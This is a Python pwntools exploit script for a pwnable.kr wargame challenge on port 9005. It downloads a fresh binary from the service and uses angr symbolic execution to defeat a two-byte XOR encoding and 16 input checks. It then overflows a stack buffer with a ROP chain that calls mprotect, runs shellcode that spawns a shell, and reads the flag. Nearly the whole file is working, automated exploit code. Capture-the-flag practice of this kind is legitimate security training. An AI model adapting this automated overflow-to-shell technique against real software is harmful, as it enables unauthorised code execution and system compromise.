#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host pwnable.kr --port 9005
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './path/to/binary'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 9005)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


# the programs flow is as follows:
# 1. argv1 is decoded
# 1.1. hex decoded
# 1.2. xored with a repeating pattern of length 2
# 2. then a prefix of length 48 is validated in 16 functions, each validating 3 bytes
# 3. if we pass all validations, we memcpy the reset of the buffer into a fixed size stack buffer

# exploitation
# so we need to bypass all checks, then some simple rop will do. the overall steps are:
# 1. understand encoding - most importantly the xor pattern. i have done this by sending a payload consisting of nulls only and simulating the program until after the encoding to see the xors
# 2. bypass all checks - we need to first find the checks, then use angr to solve them.
# 3. ROP
# 3.0 in order to even start ROPping we need to overflow the buffer correctly. the vulnerable function's stack size varies, so we need to find it.
# 3.1 we have a mprotect gadget - if we call it with the decoded buffer as input we can place a shellcode there and jump to it. thus, we need to find the global buffer address
# 3.2 we need a set rdx, rdi, rsi gadgets in order to call mprotect. there is always such a gadget in the binary, we need to find it. we also need to understand at what offsets on the stack it expects to find the registers as it varies.

import itertools
import mmap

from typing import Iterable

import angr
import capstone
import claripy
import unlzw3

from angr.analyses import Disassembly
from angr.analyses.disassembly import Instruction

def get_challenge(io: tube) -> bytes:
    io.recvline_startswith(b"wait...")
    return unlzw3.unlzw(b64d(io.recvuntil(b"here, get this binary and give me some crafted argv[1] for explotation", drop=True).strip()))

def solve_func(proj: angr.Project, addr: int) -> tuple[bytes, int]:
    args = [claripy.BVS('arg_%d' % i, 8) for i in range(3)]
    state = proj.factory.call_state(addr, *args, add_options=angr.options.unicorn)

    simgr = proj.factory.simgr(state)

    def get_last_block_insn(st: angr.SimState) -> Instruction:
        block = proj.factory.block(st.addr)
        disasm = proj.analyses[Disassembly].prep()(ranges=[(block.addr, block.addr + block.size)])
        insns = [r for r in disasm.raw_result if isinstance(r, Instruction)]

        return insns[-1]

    def is_at_call(st: angr.SimState) -> bool:
        try:
            return get_last_block_insn(st).insn.mnemonic == "call"
        except:
            return False

    while simgr.active and not any(is_at_call(ac) for ac in simgr.active):
        simgr.step()
    
    calling_state = next(ac for ac in simgr.active if is_at_call(ac))

    return bytes([calling_state.solver.eval(x) for x in args]), get_last_block_insn(calling_state).insn.operands[0].imm

def _find_binary_params(proj: angr.Project) -> tuple[Iterable[int], int, int]:
    """
    returns a xor_pattern iterator, the first validation address and the address of the global buffer
    """
    argv = [proj.filename, b"00" * 48 + b"\x00"]
    state = proj.factory.entry_state(args=argv, add_options=angr.options.unicorn)

    simgr = proj.factory.simgr(state)

    simgr.run(until=lambda sm: any(b"payload encoded." in ac.posix.dumps(1) for ac in sm.active))

    block = proj.factory.block(simgr.active[0].addr)
    disasm = proj.analyses[Disassembly].prep()(ranges=[(block.addr, block.addr + block.size)])
    insns = [r for r in disasm.raw_result if isinstance(r, Instruction)]

    mov_from_mem_addresses = []
    for i in insns:
        try:
            mov_from_mem_addresses.append(i.operands[1].values[0].val)
        except:
            pass

    global_buf_address = min(mov_from_mem_addresses) 

    assert insns[-1].insn.mnemonic == "call"

    simgr.step(num_inst=len(insns))

    s = simgr.active[0]

    def get_val(reg) -> int:
        return s.solver.eval(reg)

    assert get_val(s.regs.rdx) == get_val(s.regs.rdi)

    return itertools.cycle([get_val(s.regs.rdi), get_val(s.regs.rsi)] * 24), insns[-1].insn.operands[0].imm, global_buf_address

def encode_input(input: bytes, pattern: bytes) -> bytes:
    return binascii.hexlify(bytes([x ^ y for (x, y) in zip(input, pattern)]))

def get_last_function_stack_size(proj: angr.Project, addr: int) -> int:
    block = proj.factory.block(addr)
    disasm = proj.analyses[Disassembly].prep()(ranges=[(block.addr, block.addr + block.size)])
    insns = [r for r in disasm.raw_result if isinstance(r, Instruction)]

    i = insns[2]
    assert i.insn.mnemonic == "sub"
    assert i.insn.operands[0].reg == capstone.x86.X86_REG_RSP

    return i.insn.operands[1].imm

def solve_challenge(proj: angr.Project) -> tuple[Iterable[int], bytes, int, int]:
    xor_pattern, addr, global_buf_address = _find_binary_params(proj)
    input = b""
    for _ in range(16):
        cur_input, addr = solve_func(proj, addr)
        input += cur_input

    return xor_pattern, input, get_last_function_stack_size(proj, addr), global_buf_address

def find_gadget(proj: angr.Project) -> tuple[int, dict[str, int]]:
    argv = [proj.filename, b"00" * 48 + b"\x00"]
    state = proj.factory.entry_state(args=argv, add_options=angr.options.unicorn)

    simgr = proj.factory.simgr(state)

    def match_regs(st: angr.SimState) -> bool:
        values = {
            "r9d":  6,
            "r8d":  5,
            "ecx":  4,
            "edx":  3,
            "esi":  2,
            "edi":  1,
        }
        
        return all(getattr(st.regs, reg).args[0] == val for reg, val in values.items())
    
    while not any(match_regs(st) for st in simgr.active):
        simgr.step(num_inst=1)
    
    block = proj.factory.block(simgr.active[0].addr)
    disasm = proj.analyses[Disassembly].prep()(ranges=[(block.addr, block.addr + block.size)])
    insns = [r for r in disasm.raw_result if isinstance(r, Instruction)]

    i = insns[-1]

    assert i.insn.mnemonic == "call"
    target_function = i.insn.operands[0].imm

    block = proj.factory.block(target_function)
    disasm = proj.analyses[Disassembly].prep()(ranges=[(block.addr, block.addr + block.size)])
    insns = [r for r in disasm.raw_result if isinstance(r, Instruction)]

    gadget_start = insns[9].addr

    state = proj.factory.call_state(addr=gadget_start)
    state.regs.rbp = state.regs.rsp
    for i in range(0x100):
        state.stack_push(i)

    simgr = proj.factory.simgr(state)

    simgr.step()  # walk until the inner call
    simgr.step()  # walk until the inner call returns

    block = proj.factory.block(simgr.active[0].addr)
    disasm = proj.analyses[Disassembly].prep()(ranges=[(block.addr, block.addr + block.size)])
    insns = [r for r in disasm.raw_result if isinstance(r, Instruction)]

    while not simgr.active[0].addr == insns[-1].addr:
        simgr.step(num_inst=1)

    return gadget_start, {
        reg: getattr(simgr.active[0].regs, reg).args[0] for reg in ("rsi", "rdi", "rdx")
    }


def exploit(path: str):
    exe = ELF(path)
    proj = angr.Project(path)

    gadget_addr, reg_offsets = find_gadget(proj)

    info(f"gadget address: 0x{gadget_addr:x}")

    xor_pattern, input, last_function_stack_size, global_buf_address = solve_challenge(proj)

    info(f"last function stack size: 0x{last_function_stack_size:x}")
    info(f"global buf address: 0x{global_buf_address:x}")
    info(f"input: {input}")

    rdi = global_buf_address & (~(mmap.PAGESIZE - 1))
    rsi = 2 * mmap.PAGESIZE
    rdx = mmap.PROT_EXEC | mmap.PROT_READ | mmap.PROT_WRITE

    BUFFER_PREFIX_SIZE = 0x30
    RESERVED_STACK_SIZE = 0x200
    SHELLCODE_OFFSET = 0x300

    rop_: bytes = cyclic(last_function_stack_size)
    rop_ += pack(global_buf_address + BUFFER_PREFIX_SIZE + last_function_stack_size + 0x10 + RESERVED_STACK_SIZE)  # RBP - 
    rop_ += pack(gadget_addr)
    rop_ += flat({
        RESERVED_STACK_SIZE - (reg_offsets["rdx"] + 1) * 0x8: rdx,
        RESERVED_STACK_SIZE - (reg_offsets["rdi"] + 1) * 0x8: rdi,
        RESERVED_STACK_SIZE - (reg_offsets["rsi"] + 1) * 0x8: rsi,
        RESERVED_STACK_SIZE: 0,  # saved rbp (fake rbp point here)
        RESERVED_STACK_SIZE + 0x8: exe.sym["mprotect"],  # first return address
        RESERVED_STACK_SIZE + 0x10: global_buf_address + BUFFER_PREFIX_SIZE + SHELLCODE_OFFSET,  # second return address - shellcode
    })  # fake stack
    assert len(rop_) < SHELLCODE_OFFSET
    rop_ = rop_.ljust(SHELLCODE_OFFSET, b"A")
    rop_ += asm(shellcraft.sh())

    return encode_input(input+rop_, xor_pattern)

io = start()
with open("challenge", "wb") as f:
    f.write(get_challenge(io))

argv1 = exploit("challenge")
info(f"encoded input: {argv1}")

io.sendline(argv1)
io.sendline(b"echo AAAA; cat flag")
io.recvuntil(b"AAAA\n")
log.success(f"flag = '{term.text.bold_italic_yellow(io.recvline().decode().strip())}'")